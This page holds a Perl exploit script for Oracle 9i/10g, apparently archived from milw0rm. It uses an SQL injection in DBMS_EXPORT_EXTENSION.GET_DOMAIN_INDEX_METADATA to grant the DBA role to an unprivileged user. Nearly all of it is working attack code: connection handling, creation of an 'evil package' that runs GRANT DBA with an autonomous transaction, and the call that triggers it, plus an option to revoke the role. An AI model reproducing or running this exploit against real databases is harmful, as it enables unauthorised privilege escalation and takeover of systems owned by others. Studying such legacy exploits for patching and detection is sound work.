<html><head><title>Oracle 9i/10g DBMS_EXPORT_EXTENSION SQL Injection Exploit</title></head><pre>#!/usr/bin/perl
#
# Remote Oracle dbms_export_extension exploit (any version)
# Grant or revoke dba permission to unprivileged user
# 
# Tested on Oracle 10g - Release 10.2.0.1.0
#	    Oracle  9i - Release  9.2.0.2.0
# 
#   REF:    http://www.securityfocus.com/bid/17699
#
#   AUTHOR: Andrea &quot;bunker&quot; Purificato
#           http://rawlab.mindcreations.com
#
#   DATE:   Copyright 2007 - Sun Feb  4 15:53:04 CET 2007
#
# Oracle InstantClient (basic + sdk) required for DBD::Oracle
#
use warnings;
use strict;
use DBI;
use DBD::Oracle;
use Getopt::Std;
use vars qw/ %opt /;

sub usage {
    print &lt;&lt;&quot;USAGE&quot;;
    
Syntax: $0 -h &lt;host&gt; -s &lt;sid&gt; -u &lt;user&gt; -p &lt;passwd&gt; -g|-r

Options:
     -h     &lt;host&gt;     target server address
     -s     &lt;sid&gt;      target sid name
     -u     &lt;user&gt;     user
     -p     &lt;passwd&gt;   password 

     -g|-r             (g)rant dba to user | (r)evoke dba from user

USAGE
    exit 0
}

my $opt_string = 'h:s:u:p:gr';
getopts($opt_string, \%opt) or &amp;usage;
&amp;usage if ( !$opt{h} or !$opt{s} or !$opt{u} or !$opt{p} );
&amp;usage if ( !$opt{g} and !$opt{r} );
my $user = uc $opt{u};

my $dbh = DBI-&gt;connect(&quot;dbi:Oracle:host=$opt{h};sid=$opt{s}&quot;, $opt{u}, $opt{p}) or die;

my $sqlcmd = &quot;GRANT DBA TO $user&quot;;

print &quot;[-] Wait...\n&quot;;
$dbh-&gt;{RaiseError} = 1;

if ($opt{r}) {
    print &quot;[-] Revoking DBA from $user...\n&quot;;
    $sqlcmd = &quot;REVOKE DBA FROM $user&quot;;
    $dbh-&gt;do( $sqlcmd );
    print &quot;[-] Done!\n&quot;;
    $dbh-&gt;disconnect;
    exit;
}

$dbh-&gt;do( qq{ 
CREATE OR REPLACE PACKAGE BUNKERPKG AUTHID CURRENT_USER IS
FUNCTION ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3
VARCHAR2,p4 VARCHAR2,env SYS.odcienv) RETURN NUMBER;
END;
} );

print &quot;[-] Building evil package\n&quot;;

$dbh-&gt;do(qq{ 
CREATE OR REPLACE PACKAGE BODY BUNKERPKG IS
FUNCTION ODCIIndexGetMetadata (oindexinfo SYS.odciindexinfo,P3
VARCHAR2,p4 VARCHAR2,env SYS.odcienv) RETURN NUMBER IS
pragma autonomous_transaction;
BEGIN
EXECUTE IMMEDIATE '$sqlcmd';
COMMIT;
RETURN(1);
END;
END;
} );

print &quot;[-] Finishing evil package\n&quot;;

$dbh-&gt;do(qq{ 
DECLARE
INDEX_NAME VARCHAR2(200);
INDEX_SCHEMA VARCHAR2(200);
TYPE_NAME VARCHAR2(200);
TYPE_SCHEMA VARCHAR2(200);
VERSION VARCHAR2(200);
NEWBLOCK PLS_INTEGER;
GMFLAGS NUMBER;
v_Return VARCHAR2(200);
BEGIN
INDEX_NAME := 'A1';
INDEX_SCHEMA := '$user';
TYPE_NAME := 'BUNKERPKG';
TYPE_SCHEMA := '$user';
VERSION := '';
GMFLAGS := 1;
v_Return := SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_METADATA(
INDEX_NAME =&gt; INDEX_NAME, INDEX_SCHEMA =&gt; INDEX_SCHEMA, TYPE_NAME
=&gt; TYPE_NAME,
TYPE_SCHEMA =&gt; TYPE_SCHEMA, VERSION =&gt; VERSION, NEWBLOCK =&gt;
NEWBLOCK, GMFLAGS =&gt; GMFLAGS
);
END;
} );

print &quot;[-] YOU GOT THE POWAH!!\n&quot;;

$dbh-&gt;disconnect;

exit;

# milw0rm.com [2007-02-05]</pre></html>